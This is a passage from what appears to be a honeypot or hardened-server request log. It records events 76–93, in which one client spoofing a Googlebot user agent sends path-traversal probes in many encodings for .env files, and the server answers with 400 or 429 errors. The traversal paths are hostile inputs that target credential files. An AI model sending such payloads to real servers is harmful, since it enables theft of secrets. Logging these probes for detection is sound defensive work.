+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     7 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:33 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #76 of 93
+========================================================================
+  Request ID:     1781596653353032102-11249
+  Timestamp:      2026-06-16T07:57:33.353033075Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /../../.env.local
+  Path:           /../../.env.local
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     84 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:33 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #77 of 93
+========================================================================
+  Request ID:     1781596653353203126-11252
+  Timestamp:      2026-06-16T07:57:33.353203555Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /../.env
+  Path:           /../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     5 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:33 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #78 of 93
+========================================================================
+  Request ID:     1781596653360797990-11255
+  Timestamp:      2026-06-16T07:57:33.360799474Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /..%5C.env
+  Path:           /..\.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     1 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:33 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #79 of 93
+========================================================================
+  Request ID:     1781596653748649593-11454
+  Timestamp:      2026-06-16T07:57:33.748650377Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /../../../.env
+  Path:           /../../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     91 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:33 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #80 of 93
+========================================================================
+  Request ID:     1781596658554202481-12260
+  Timestamp:      2026-06-16T07:57:38.554202865Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /..%5C..%5C..%5Cenv
+  Path:           /..\..\..\env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     87 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:38 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #81 of 93
+========================================================================
+  Request ID:     1781596658645336907-12268
+  Timestamp:      2026-06-16T07:57:38.645337822Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /..%5C..%5Cenv
+  Path:           /..\..\env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     92 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:38 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #82 of 93
+========================================================================
+  Request ID:     1781596659419547791-12462
+  Timestamp:      2026-06-16T07:57:39.41954911Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /..%2f.env
+  Path:           /../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     20 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:39 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #83 of 93
+========================================================================
+  Request ID:     1781596659419892288-12463
+  Timestamp:      2026-06-16T07:57:39.419892746Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /%2e%2e/.env
+  Path:           /../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     20 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:39 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #84 of 93
+========================================================================
+  Request ID:     1781596659420013411-12464
+  Timestamp:      2026-06-16T07:57:39.420013889Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /%2e%2e/%2e%2e/.env
+  Path:           /../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     17 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:39 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #85 of 93
+========================================================================
+  Request ID:     1781596659420449158-12465
+  Timestamp:      2026-06-16T07:57:39.420449606Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /..%2f..%2f.env
+  Path:           /../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     15 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:39 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #86 of 93
+========================================================================
+  Request ID:     1781596659420702783-12468
+  Timestamp:      2026-06-16T07:57:39.420703728Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /%2f%2e%2e%2f%2e%2e%2f.env
+  Path:           //../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     19 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:39 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #87 of 93
+========================================================================
+  Request ID:     1781596659420828322-12470
+  Timestamp:      2026-06-16T07:57:39.420828709Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /..%5c..%5c.env
+  Path:           /..\..\.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     115 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:39 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #88 of 93
+========================================================================
+  Request ID:     1781596659420957918-12471
+  Timestamp:      2026-06-16T07:57:39.420958235Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /%2e%2e%2f.env
+  Path:           /../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     18 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:39 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #89 of 93
+========================================================================
+  Request ID:     1781596659421004311-12472
+  Timestamp:      2026-06-16T07:57:39.421005082Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /..%5c.env
+  Path:           /..\.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     20 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:39 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #90 of 93
+========================================================================
+  Request ID:     1781596659421080782-12473
+  Timestamp:      2026-06-16T07:57:39.421082158Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /..%252f.env
+  Path:           /..%2f.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     21 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:39 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #91 of 93
+========================================================================
+  Request ID:     1781596659421190314-12474
+  Timestamp:      2026-06-16T07:57:39.421190918Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /%2e%2e%2f%2e%2e%2f.env
+  Path:           /../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     20 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:39 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #92 of 93
+========================================================================
+  Request ID:     1781596659422035496-12479
+  Timestamp:      2026-06-16T07:57:39.422036305Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /..%5c..%5c..%5c.env
+  Path:           /..\..\..\.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     18 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:39 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #93 of 93
+========================================================================
+  Request ID:     1781596659444368052-12499
+  Timestamp:      2026-06-16T07:57:39.444368879Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /%2f%2e%2e%2f.env
+  Path:           //../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:39 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
